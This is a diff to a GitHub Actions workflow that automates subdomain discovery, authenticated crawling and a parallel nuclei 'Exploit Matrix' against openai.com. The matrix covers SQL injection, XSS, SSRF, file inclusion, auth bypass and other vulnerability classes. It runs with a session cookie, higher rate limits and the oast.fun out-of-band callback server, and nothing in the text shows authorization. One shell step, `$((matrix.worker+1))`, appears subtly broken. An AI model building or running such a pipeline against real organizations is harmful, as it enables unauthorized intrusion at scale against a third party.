@@ -25,25 +25,41 @@ jobs:
 
       - name: Install Recon Arsenal
         run: |
+          GO_BIN=$(go env GOPATH)/bin
           go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
           go install github.com/projectdiscovery/httpx/cmd/httpx@latest
           go install github.com/projectdiscovery/katana/cmd/katana@latest
           go install github.com/projectdiscovery/uncover/cmd/uncover@latest
-          echo "$HOME/go/bin" >> $GITHUB_PATH
+          export PATH="$PATH:$GO_BIN"
+          subfinder -version
+          httpx -version
+          katana -version
+          uncover -version
 
-      - name: Passive Subdomain Discovery
-        run: subfinder -d openai.com -all -silent -o subs.txt || true
+      - name: Passive Discovery
+        run: |
+          GO_BIN=$(go env GOPATH)/bin
+          export PATH="$PATH:$GO_BIN"
+          subfinder -d openai.com -all -silent -o subs.txt || true
 
-      - name: Cloud & External Asset Discovery
-        run: uncover -q "openai.com" -limit 1000 -auth "$PDCP_API_KEY" >> subs.txt || true
+      - name: Cloud & Asset Discovery
+        run: |
+          GO_BIN=$(go env GOPATH)/bin
+          export PATH="$PATH:$GO_BIN"
+          uncover -q "openai.com" -limit 1000 -auth "$PDCP_API_KEY" >> subs.txt || true
 
-      - name: Alive Filtering
-        run: sort -u subs.txt | httpx -silent -o alive.txt || touch alive.txt
+      - name: Filter Alive
+        run: |
+          GO_BIN=$(go env GOPATH)/bin
+          export PATH="$PATH:$GO_BIN"
+          sort -u subs.txt | httpx -silent -o alive.txt || touch alive.txt
 
       - name: Authenticated Deep Crawl
         run: |
+          GO_BIN=$(go env GOPATH)/bin
+          export PATH="$PATH:$GO_BIN"
           katana -list alive.txt -jc -kf all -d 3 \
-          -H "Cookie: $AUTH_COOKIE" -o params_new.txt || touch params_new.txt
+            -H "Cookie: $AUTH_COOKIE" -o params_new.txt || touch params_new.txt
 
       - name: Normalize & Index Targets
         run: |
@@ -51,7 +67,7 @@ jobs:
           grep -vFf params.txt params_new.txt > to_scan.txt || cp params_new.txt to_scan.txt
           cat params.txt params_new.txt | sort -u > master_updated.txt
 
-      - name: Split Target Buckets
+      - name: Bucket Targets
         run: |
           mkdir -p buckets
           split -n l/7 to_scan.txt buckets/bucket_
@@ -74,7 +90,7 @@ jobs:
       fail-fast: false
       matrix:
         worker: [0,1,2,3,4,5,6]
-        vuln: [sqli, xss, ssti, ssrf, idor, lfi, rfi, takeovers, misconfig, exposure, auth-bypass, logic]
+        vuln: [sqli, xss, ssti, ssrf, idor, lfi, rfi, takeover, misconfig, exposure, auth-bypass, logic]
 
     steps:
       - uses: actions/checkout@v4
@@ -85,20 +101,29 @@ jobs:
 
       - name: Install Nuclei Engine
         run: |
+          GO_BIN=$(go env GOPATH)/bin
           go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-          echo "$HOME/go/bin" >> $GITHUB_PATH
+          export PATH="$PATH:$GO_BIN"
+          nuclei -version
           nuclei -ut
 
       - name: Execute Exploit Matrix
         run: |
+          GO_BIN=$(go env GOPATH)/bin
+          export PATH="$PATH:$GO_BIN"
+
           TARGET_FILE=$(ls buckets/bucket_* | sed -n "$((matrix.worker+1))p")
           [ -s "$TARGET_FILE" ] || exit 0
 
           nuclei -l "$TARGET_FILE" \
             -severity critical,high,medium \
             -tags ${{ matrix.vuln }},cve,cve2025,cve2026 \
+            -rate-limit 200 \
+            -bulk-size 50 \
+            -resolvers https://raw.githubusercontent.com/projectdiscovery/dnsblast/main/resolvers.txt \
             -interactsh-server oast.fun \
             -H "Cookie: $AUTH_COOKIE" \
+            -stats \
             -o results.txt || true
 
       - name: Persist Intelligence
